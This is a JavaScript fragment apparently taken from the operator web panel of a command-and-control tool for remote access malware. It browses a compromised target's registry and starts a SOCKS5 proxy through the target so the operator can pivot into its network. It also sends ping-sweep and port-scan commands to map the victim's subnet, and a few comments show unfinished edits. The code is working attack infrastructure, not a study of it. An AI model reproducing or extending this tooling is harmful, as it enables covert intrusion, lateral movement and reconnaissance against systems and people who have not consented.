		valBody.innerHTML = `<tr><td colspan="3" style="text-align:center;padding:3rem;color:var(--text-3);font-size:.7rem">No values found in this key.</td></tr>`;
	}
	$("regStatus").textContent = `${data.subkeys?.length || 0} keys, ${data.values?.length || 0} values`;
};

function _regFormatType(t) {
	const types = { 1:"REG_SZ", 2:"REG_EXPAND_SZ", 3:"REG_BINARY", 4:"REG_DWORD", 7:"REG_MULTI_SZ", 11:"REG_QWORD" };
	return types[t] || `TYPE_${t}`;
}

// Update handleMsg to route reg_list
const _origHandleMsg = window.handleMsg; // Assume handleMsg is global
// Wait, handleMsg is inside an anonymous function usually or defined globally.
// I'll just append the logic to the existing handleMsg if I can find it.


// â”€â”€ MATRIX ANIMATION â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
function initMatrix() {
	const canvas = document.getElementById("matrixCanvas");
	if (!canvas) return;
	const ctx = canvas.getContext("2d");
	let w = (canvas.width = canvas.offsetWidth);
	let h = (canvas.height = canvas.offsetHeight);
	const cols = Math.floor(w / 20) + 1;
	const ypos = Array(cols).fill(0);

	function step() {
		ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
		ctx.fillRect(0, 0, w, h);
		ctx.fillStyle = "#0f0";
		ctx.font = "15pt monospace";
		ypos.forEach((y, ind) => {
			const text = String.fromCharCode(Math.random() * 128);
			const x = ind * 20;
			ctx.fillText(text, x, y);
			if (y > 100 + Math.random() * 10000) ypos[ind] = 0;
			else ypos[ind] = y + 20;
		});
	}
	setInterval(step, 50);
	window.addEventListener("resize", () => {
		w = canvas.width = canvas.offsetWidth;
		h = canvas.height = canvas.offsetHeight;
	});
}
document.addEventListener("DOMContentLoaded", () => {
	initMatrix();
});

window._promptSocksStart = () => {
	const port = prompt("SOCKS5 Proxy Port (Local on C2):", "1080");
	if (port) {
		fetch("/api/node/socks", {
			method: "POST",
			headers: { "Content-Type": "application/json" },
			body: JSON.stringify({ node_id: currentTargetId, action: "start", port: parseInt(port) })
		})
		.then(r => r.json())
		.then(d => {
			showNotification(d.msg || "SOCKS Started", "info");
			$("toolsResult").textContent = `[SOCKS] Server listening on ${port}. Use your browser with SOCKS5 proxy: C2_IP:${port}`;
			$("toolsResultWrap").style.display = "block";
		});
	}
};

window.stopSocks = () => {
	fetch("/api/node/socks", {
		method: "POST",
		headers: { "Content-Type": "application/json" },
		body: JSON.stringify({ node_id: currentTargetId, action: "stop" })
	})
	.then(r => r.json())
	.then(d => {
		showNotification(d.msg || "SOCKS Stopped", "info");
	});
};

window._promptPingSweep = () => {
	const prefix = prompt("Network Prefix (e.g., 192.168.1):", "192.168.1");
	if (prefix) sendCmd('net_scan', { mode: 'sweep', target: prefix });
};

window._promptPortScan = () => {
	const ip = prompt("Target IP to Scan:", "192.168.1.1");
	if (ip) sendCmd('net_scan', { mode: 'portscan', target: ip });
};

// Response Processing for Recon
const handleReconResponse = (data) => {
	if (data.t === "subnet_info") {
		showNotification(`Local IP: ${data.ip}`, "info");
		$("toolsResult").textContent = `[RECON] Found Subnet: ${data.prefix}.0/24 (My IP: ${data.ip})`;
		$("toolsResultWrap").style.display = "block";
	} else if (data.t === "scan_results") {
		if (data.mode === "sweep") {
			const hosts = data.hosts.join(", ") || "No hosts found.";
			$("toolsResult").textContent = `[RECON] Ping Sweep Results (${data.hosts.length} hosts):\n\n${hosts}`;
		} else {
			const ports = data.ports.join(", ") || "No common ports open.";
			$("toolsResult").textContent = `[RECON] Port Scan Results for ${data.target}:\n\nOpen Ports: ${ports}`;
		}
		$("toolsResultWrap").style.display = "block";
	}
};
